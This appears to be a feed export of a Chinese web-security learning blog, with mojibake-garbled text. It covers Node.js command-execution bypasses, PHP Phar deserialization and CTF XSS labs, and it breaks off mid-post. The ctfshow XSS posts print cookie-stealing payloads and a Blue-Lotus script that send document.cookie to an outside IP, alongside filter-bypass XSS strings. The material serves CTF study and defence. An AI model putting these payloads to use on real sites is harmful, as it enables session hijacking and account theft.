ç¤ºä¾‹-5" class="headerlink" title="ä»£ç ç¤ºä¾‹"></a><strong>ä»£ç ç¤ºä¾‹</strong></h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line">fs.<span class="title function_">writeFileSync</span>(<span class="string">&#x27;/tmp/exploit.sh&#x27;</span>, <span class="string">&#x27;æ¶æ„å‘½ä»¤&#x27;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;bash /tmp/exploit.sh&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h3 id="ç‰¹ç‚¹-5"><a href="#ç‰¹ç‚¹-5" class="headerlink" title="ç‰¹ç‚¹"></a><strong>ç‰¹ç‚¹</strong></h3><p>âœ… å¯ç»•è¿‡ç®€å•å‘½ä»¤é»‘åå•ã€‚<br>âŒ ä¾èµ– <strong>æ–‡ä»¶å†™å…¥æƒé™</strong>ã€‚<br>âŒ å¯èƒ½è¢« <strong>æ–‡ä»¶ç›‘æ§</strong> æ£€æµ‹ã€‚  </p><h3 id="é˜²å¾¡æªæ–½-5"><a href="#é˜²å¾¡æªæ–½-5" class="headerlink" title="é˜²å¾¡æªæ–½"></a><strong>é˜²å¾¡æªæ–½</strong></h3><ul><li>é™åˆ¶ä¸´æ—¶ç›®å½•å†™å…¥æƒé™ã€‚</li><li>ç›‘æ§æ•æ„Ÿæ–‡ä»¶åˆ›å»ºï¼ˆå¦‚ <code>/tmp/exploit.sh</code>ï¼‰ã€‚</li></ul><hr><h2 id="æ€»ç»“å¯¹æ¯”è¡¨"><a href="#æ€»ç»“å¯¹æ¯”è¡¨" class="headerlink" title="æ€»ç»“å¯¹æ¯”è¡¨"></a><strong>æ€»ç»“å¯¹æ¯”è¡¨</strong></h2><table><thead><tr><th>æ–¹æ³•</th><th>é€‚ç”¨åœºæ™¯</th><th>ç»•è¿‡èƒ½åŠ›</th><th>é˜²å¾¡æªæ–½</th></tr></thead><tbody><tr><td><code>child_process.exec</code></td><td>å¸¸è§„å‘½ä»¤æ‰§è¡Œ</td><td>âŒ</td><td>è¾“å…¥è¿‡æ»¤ + <code>execFile</code></td></tr><tr><td><code>process.mainModule._load</code></td><td>ç»•è¿‡ <code>require</code> é™åˆ¶</td><td>âœ…</td><td>å†»ç»“ <code>global.process</code></td></tr><tr><td><code>vm</code> æ²™ç®±é€ƒé€¸</td><td>æ²™ç®±ç¯å¢ƒ</td><td>âœ…ï¼ˆéœ€æ¼æ´ï¼‰</td><td>ä½¿ç”¨ <code>vm2</code> æ²™ç®±</td></tr><tr><td><code>process.binding</code></td><td>åº•å±‚ API è°ƒç”¨</td><td>âœ…</td><td>åˆ é™¤ <code>process.binding</code></td></tr><tr><td><code>Worker Threads</code></td><td>å¤šçº¿ç¨‹éšè—æ‰§è¡Œ</td><td>âœ…</td><td>ç¦ç”¨ <code>eval: true</code></td></tr><tr><td><code>fs + exec</code></td><td>æ–‡ä»¶å†™å…¥åæ‰§è¡Œ</td><td>âœ…</td><td>æ–‡ä»¶ç›‘æ§ + æƒé™é™åˆ¶</td></tr></tbody></table><hr><h2 id="ç»ˆæé˜²å¾¡å»ºè®®"><a href="#ç»ˆæé˜²å¾¡å»ºè®®" class="headerlink" title="ç»ˆæé˜²å¾¡å»ºè®®"></a><strong>ç»ˆæé˜²å¾¡å»ºè®®</strong></h2><ol><li><strong>æœ€å°æƒé™åŸåˆ™</strong>ï¼šNode.js è¿›ç¨‹ä»¥ä½æƒé™ç”¨æˆ·è¿è¡Œã€‚</li><li><strong>è¾“å…¥è¿‡æ»¤</strong>ï¼šç¦æ­¢ç”¨æˆ·è¾“å…¥è¿›å…¥ <code>exec</code>ã€<code>eval</code> ç­‰ã€‚</li><li><strong>ä¾èµ–æ£€æŸ¥</strong>ï¼šé¿å…ä½¿ç”¨æ¶æ„ç¬¬ä¸‰æ–¹åŒ…ï¼ˆå¦‚ <code>npm audit</code>ï¼‰ã€‚</li><li><strong>WAF</strong>ï¼šä½¿ç”¨ Web åº”ç”¨é˜²ç«å¢™æ‹¦æˆªå¯ç–‘è¯·æ±‚ã€‚</li><li><strong>æ²™ç®±éš”ç¦»</strong>ï¼šæ•æ„Ÿæ“ä½œæ”¾åœ¨å—é™ç¯å¢ƒï¼ˆå¦‚ Dockerã€<code>vm2</code>ï¼‰ã€‚</li></ol><hr><p>âš ï¸ <strong>é‡è¦æé†’</strong>ï¼šä»¥ä¸Šæ–¹æ³•ä»…é™ <strong>æˆæƒæ¸—é€æµ‹è¯•</strong>ï¼Œæœªç»æˆæƒä½¿ç”¨å± <strong>è¿æ³•è¡Œä¸º</strong>ï¼</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="nodejs" scheme="http://example.com/categories/nodejs/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="aiå†™çš„" scheme="http://example.com/tags/ai%E5%86%99%E7%9A%84/"/>
    
  </entry>
  
  <entry>
    <title>Pharååºåˆ—åŒ–</title>
    <link href="http://example.com/2025/03/20/web/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2025/03/20/web/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2025-03-20T21:10:52.000Z</published>
    <updated>2025-03-30T08:46:25.590Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Pharååºåˆ—åŒ–æ˜¯ä¸€ç§åˆ©ç”¨Pharæ–‡ä»¶çš„ç‰¹æ€§è¿›è¡Œæ”»å‡»çš„æ–¹æ³•ã€‚Pharæ–‡ä»¶æ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œç±»ä¼¼äºJavaä¸­çš„JARåŒ…ï¼ŒPharæ–‡ä»¶ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œä»è€Œæ‰©å±•ååºåˆ—åŒ–æ¼æ´çš„æ”»å‡»é¢</p><h2 id="ååºåˆ—åŒ–çš„æ¡ä»¶"><a href="#ååºåˆ—åŒ–çš„æ¡ä»¶" class="headerlink" title="ååºåˆ—åŒ–çš„æ¡ä»¶"></a>ååºåˆ—åŒ–çš„æ¡ä»¶</h2><p>è¦å®ç°Pharååºåˆ—åŒ–ï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹å‡ ä¸ªæ¡ä»¶ï¼š</p><p>Pharæ–‡ä»¶èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ï¼šæ”»å‡»è€…éœ€è¦èƒ½å¤Ÿå°†Pharæ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼Œä»¥ä¾¿åˆ©ç”¨Pharæ–‡ä»¶ä¸­çš„åºåˆ—åŒ–æ•°æ®è¿›è¡Œååºåˆ—åŒ–æ”»å‡»</p><p>å­˜åœ¨å¯åˆ©ç”¨çš„é­”æœ¯æ–¹æ³•ï¼šPharæ–‡ä»¶ä¸­çš„meta-dataä¼šåœ¨ååºåˆ—åŒ–æ—¶è¢«è§£æï¼Œå› æ­¤éœ€è¦æœ‰å¯åˆ©ç”¨çš„é­”æœ¯æ–¹æ³•ï¼ˆå¦‚__destructã€__wakeupç­‰ï¼‰ä½œä¸ºâ€œè·³æ¿â€ï¼Œä»¥ä¾¿åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ‰§è¡Œæ¶æ„ä»£ç </p><p>æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼šéœ€è¦èƒ½å¤Ÿæ§åˆ¶æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°ï¼Œå¹¶ä¸”è¿™äº›å‚æ•°ä¸­åŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚:ã€&#x2F;ã€pharç­‰ï¼‰æ²¡æœ‰è¢«è¿‡æ»¤ã€‚è¿™æ ·å¯ä»¥é€šè¿‡Pharä¼ªåè®®è¯»å–å¹¶è§£æPharæ–‡ä»¶ï¼Œä»è€Œè§¦å‘ååºåˆ—åŒ–</p><h2 id="ç¤ºä¾‹ä»£ç "><a href="#ç¤ºä¾‹ä»£ç " class="headerlink" title="ç¤ºä¾‹ä»£ç "></a>ç¤ºä¾‹ä»£ç </h2><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„Pharæ–‡ä»¶ç”Ÿæˆç¤ºä¾‹ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TestObject &#123;</span><br><span class="line">public function __destruct() &#123;</span><br><span class="line">echo &#x27;Destruct called&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(&quot;phar.phar&quot;);</span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;); // åç¼€åå¿…é¡»ä¸ºphar</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); // è®¾ç½®stub</span><br><span class="line">$o = new TestObject();</span><br><span class="line">$phar-&gt;setMetadata($o); // å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); // æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div><p>åœ¨ç”ŸæˆPharæ–‡ä»¶åï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹ä»£ç è§¦å‘ååºåˆ—åŒ–ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename = &#x27;phar://phar.phar/test.txt&#x27;;</span><br><span class="line">file_get_contents($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div><h2 id="é‡è¦æ³¨æ„äº‹é¡¹"><a href="#é‡è¦æ³¨æ„äº‹é¡¹" class="headerlink" title="é‡è¦æ³¨æ„äº‹é¡¹"></a>é‡è¦æ³¨æ„äº‹é¡¹</h2><p>åœ¨è¿›è¡ŒPharååºåˆ—åŒ–æ”»å‡»æ—¶ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š</p><p>Pharæ–‡ä»¶çš„ç”Ÿæˆï¼šç”ŸæˆPharæ–‡ä»¶æ—¶ï¼Œéœ€è¦å°†php.iniä¸­çš„phar.readonlyé€‰é¡¹è®¾ç½®ä¸ºOffï¼Œå¦åˆ™æ— æ³•ç”ŸæˆPharæ–‡ä»¶</p><p>ç»•è¿‡æ£€æµ‹ æ¡ä»¶ç«äº‰ç­‰æ–¹æ¡ˆæ¥ä¼ ğŸ</p><p>é€šè¿‡æ»¡è¶³ä¸Šè¿°æ¡ä»¶ï¼Œå¯ä»¥åœ¨ä¸è°ƒç”¨unserialize()å‡½æ•°çš„æƒ…å†µä¸‹å®ç°Pharååºåˆ—åŒ–æ”»å‡»ï¼Œä»è€Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚</p><p><a class="link"   href="https://xz.aliyun.com/news/6303?time__1311=YqIxgD070=BDlhzG7FD8K9P0K4Dv=NdG8AeD&u_atoken=2ce2353c671e67892a58d8137a023870&u_asig=0a472f8c17424763875994781e014c" >è¿™ä¸ªæ›´è¯¦ç»† <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="phpååºåˆ—åŒ–" scheme="http://example.com/categories/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="phpä¼ªåè®®" scheme="http://example.com/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>upload</title>
    <link href="http://example.com/2025/03/19/web/upload/upload/"/>
    <id>http://example.com/2025/03/19/web/upload/upload/</id>
    <published>2025-03-19T13:10:52.000Z</published>
    <updated>2025-03-30T08:46:25.590Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="æœ‰æ—¶é—´å†å†™"><a href="#æœ‰æ—¶é—´å†å†™" class="headerlink" title="æœ‰æ—¶é—´å†å†™"></a>æœ‰æ—¶é—´å†å†™</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="upload" scheme="http://example.com/categories/upload/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="upload" scheme="http://example.com/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>xss-lab</title>
    <link href="http://example.com/2025/03/19/web/xss/xss-lab/"/>
    <id>http://example.com/2025/03/19/web/xss/xss-lab/</id>
    <published>2025-03-19T13:10:52.000Z</published>
    <updated>2025-03-30T08:46:25.590Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>æ²¡æœ‰è¿‡æ»¤</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>ä»£ç æ’å…¥â€â€é‡Œé¢</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;</span><br></pre></td></tr></table></figure></div><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>ä»£ç æ’å…¥åˆ°â€™â€™é‡Œé¢<br>è€Œä¸”å°†ç¬¦å·å®ä½“åŒ–äº†</p><p>{onfocusäº‹ä»¶åœ¨å…ƒç´ è·å¾—ç„¦ç‚¹æ—¶è§¦å‘ï¼Œæœ€å¸¸ä¸ <input>ã€<select> å’Œ <a> æ ‡ç­¾ä¸€èµ·ä½¿ç”¨ï¼Œä»¥ä¸Šé¢å›¾ç‰‡çš„htmlæ ‡ç­¾<input>ä¸ºä¾‹ï¼Œ<input>æ ‡ç­¾æ˜¯æœ‰è¾“å…¥æ¡†çš„ï¼Œç®€å•æ¥è¯´ï¼Œonfocusäº‹ä»¶å°±æ˜¯å½“è¾“å…¥æ¡†è¢«ç‚¹å‡»çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘myFunction()å‡½æ•°ï¼Œç„¶åæˆ‘ä»¬å†é…åˆjavascriptä¼ªåè®®æ¥æ‰§è¡Œjavascriptä»£ç }</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; onfocus=javascript:alert() &#x27;</span><br></pre></td></tr></table></figure></div><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt; onfocus=javascript:alert() &lt;&quot;</span><br></pre></td></tr></table></figure></div><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>onfocusä¼¼æ‰äº†<br>æ¢ä¸€ä¸ªå§¿åŠ¿</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascript:alert()&gt;xxx&lt;/a&gt;&lt;&quot;</span><br></pre></td></tr></table></figure></div><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>a hrefä¹Ÿå¯„æ‰äº†ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤å¤§å°å†™</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt; &lt;sCript&gt;alert()&lt;/sCript&gt; &lt;&quot;</span><br></pre></td></tr></table></figure></div><h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p>åˆ¤æ–­æ£€æµ‹åˆ°ä¸Šé¢çš„å°±ä¼šè‡ªåŠ¨åˆ é™¤è¯¥å•è¯</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;scscriptript&gt;alert()&lt;/scscriptript&gt;&lt;&quot;</span><br></pre></td></tr></table></figure></div><h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p>javascript:alert(â€œxssâ€)å‘ç°ä¸å¯ä»¥ç”¨ï¼Œ&#x2F;&#x2F;æ³¨é‡Šä¹Ÿä¸å¯ä»¥ç”¨<br>è€ƒè™‘ç”¨unioncodeç¼–ç ä¹‹åç»•è¿‡</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;</span><br></pre></td></tr></table></figure></div><h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p>åœ¨8é¢˜åŸºç¡€ä¸Šé¢æ·»åŠ äº†æ£€æŸ¥æœ‰æ²¡æœ‰http:&#x2F;&#x2F;</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;//http://</span><br></pre></td></tr></table></figure></div><h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p>ç ”ç©¶ing</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="XSS" scheme="http://example.com/categories/XSS/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>xss</title>
    <link href="http://example.com/2025/03/19/web/xss/xss/"/>
    <id>http://example.com/2025/03/19/web/xss/xss/</id>
    <published>2025-03-19T13:10:52.000Z</published>
    <updated>2025-03-30T08:46:25.590Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="å¸¸è§çš„å§¿åŠ¿"><a href="#å¸¸è§çš„å§¿åŠ¿" class="headerlink" title="å¸¸è§çš„å§¿åŠ¿"></a>å¸¸è§çš„å§¿åŠ¿</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;a href=javascript:alert(1)&gt;xxx&lt;/a&gt; //æ·»åŠ æ ‡ç­¾ï¼Œä½†æ˜¯å¿…é¡»è¦ç‚¹å‡»æ ‡ç­¾æ‰æœ‰æ•ˆ</span><br><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;image src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;body onload=alert(1)&gt; // åœ¨é¡µé¢åŠ è½½å®Œæˆåæ‰§è¡ŒonloadæŒ‡å®šçš„å‡½æ•°</span><br><span class="line">&lt;svg onload=alert(1)&gt; // åœ¨SVGå›¾åƒåŠ è½½å®Œæˆåæ‰§è¡ŒonloadæŒ‡å®šçš„å‡½æ•°</span><br><span class="line">&lt;iframe/onload=alert(1)&gt;&lt;/iframe&gt; // &lt;iframe&gt;æ ‡ç­¾æ˜¯ç”¨äºåœ¨ç½‘é¡µä¸­åµŒå…¥å…¶ä»–ç½‘é¡µæˆ–æ–‡æ¡£çš„å…ƒç´ ï¼Œonloadäº‹ä»¶æ˜¯åœ¨&lt;iframe&gt;åŠ è½½å®Œæˆåè§¦å‘çš„äº‹ä»¶ã€‚</span><br><span class="line">&lt;body onload=&quot;windows.open(&#x27;https://www.baidu.com&#x27;)&quot;&gt; // åŠ è½½ç™¾åº¦é¡µé¢</span><br><span class="line"></span><br><span class="line">&lt;body onload=&#x27;console.log(1)&#x27;&gt; // æ§åˆ¶å°æ‰“å°1</span><br><span class="line">&lt;body onload=&#x27;console.info(1)&#x27;&gt;</span><br><span class="line">&lt;body onload=&#x27;console.error(1)&#x27;&gt;</span><br><span class="line">onfocus=javascript:alert()</span><br><span class="line">ç»•è¿‡æ–¹æ³•</span><br><span class="line">è¿‡æ»¤ç©ºæ ¼ï¼Œç”¨/ã€Tab(%09)æˆ–è€…/**/ä»£æ›¿ç©ºæ ¼ï¼Œå¦‚&lt;body/onload=alert(1)&gt;</span><br><span class="line">è¿‡æ»¤alertï¼Œç”¨top[&#x27;aler&#x27;+&#x27;t&#x27;]ç»•è¿‡</span><br><span class="line">è¿‡æ»¤ alert()ï¼Œç”¨top[&#x27;aler&#x27;+&#x27;t&#x27;].call ç»•è¿‡</span><br></pre></td></tr></table></figure></div><h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><p>æ²¡æœ‰ä¸€ç‚¹è¿‡æ»¤</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://47.115.221.235:1234/myjs/niuniu.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><p>è¿™æ˜¯è“è²èŠ±Blue-Lotusè‡ªå¸¦çš„è„šæœ¬</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var website=&quot;http://47.115.221.235:1234/index.php&quot;;</span><br><span class="line">(function()&#123;(new Image()).src=website+&#x27;/?keepsession=1&amp;location=&#x27;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)())+&#x27;&amp;toplocation=&#x27;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)())+&#x27;&amp;cookie=&#x27;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)())+&#x27;&amp;opener=&#x27;+escape((function()&#123;try&#123;return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#x27;&#x27;&#125;catch(e)&#123;return&#x27;&#x27;&#125;&#125;)());&#125;)();</span><br></pre></td></tr></table></figure></div><p>ä¸ä¼šçš„å–µ</p><h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><p>è¿‡æ»¤äº†script<br>æˆ‘ä»¬è€ƒè™‘imgæ ‡ç­¾</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=location.href=&quot;http://47.115.221.235:1234/index.php?cookie=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure></div><h2 id="web318-319"><a href="#web318-319" class="headerlink" title="web318-319"></a>web318-319</h2><p>åˆè¿‡æ»¤äº†img<br>æˆ‘ä»¬è€ƒè™‘body</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body onload=location.href=&quot;http://47.115.221.235:1234/index.php?cookie=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure></div><h2 id="web320-326"><a href="#web320-326" class="headerlink" title="web320-326"></a>web320-326</h2><p>è¿‡æ»¤äº†ç©ºæ ¼</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body/onload=location.href=&quot;http://47.115.221.235:1234/index.php?cookie=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="XSS" scheme="http://example.com/categories/XSS/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="ctfshow" scheme="http://example.com/tags/ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>springå­¦ä¹ </title>
    <link href="http://example.com/2025/03/16/java/sping/spring%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2025/03/16/java/sping/spring%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-03-16T15:51:00.000Z</published>
    <updated>2025-03-30T08:46:25.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ç ”ç©¶ä¸­"><a href="#ç ”ç©¶ä¸­" class="headerlink" title="ç ”ç©¶ä¸­"></a>ç ”ç©¶ä¸­</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="spring" scheme="http://example.com/tags/spring/"/>
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="framework" scheme="http://example.com/tags/framework/"/>
    
  </entry>
  
  <entry>
    <title>jwt</title>
    <link href="http://example.com/2025/03/10/web/jwt/jwt/"/>
    <id>http://example.com/2025/03/10/web/jwt/jwt/</id>
    <published>2025-03-10T20:20:52.000Z</published>
    <updated>2025-03-30T08:46:25.589Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="JWTç®€ä»‹"><a href="#JWTç®€ä»‹" class="headerlink" title="JWTç®€ä»‹"></a>JWTç®€ä»‹</h2><p>JWTå³Json Web Tokençš„ç¼©å†™ï¼Œé¡¾åæ€ä¹‰ï¼Œæ˜¯Tokençš„ä¸€ç§ã€‚å®ƒå¸¸è¢«ç”¨æ¥åœ¨å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚æ—¶ç”¨ä½œèº«ä»½è®¤è¯ã€‚ä½¿ç”¨JWTä½œä¸ºèº«ä»½è®¤è¯çš„ä¼˜åŠ¿åœ¨äºï¼šå®ƒä¸éœ€è¦åœ¨æœåŠ¡ç«¯å»ä¿ç•™ç”¨æˆ·çš„è®¤è¯ä¿¡æ¯ã€‚ä»…éœ€è¦å¯¹è¯¥Tokenæ­£ç¡®æ€§è¿›è¡Œæ 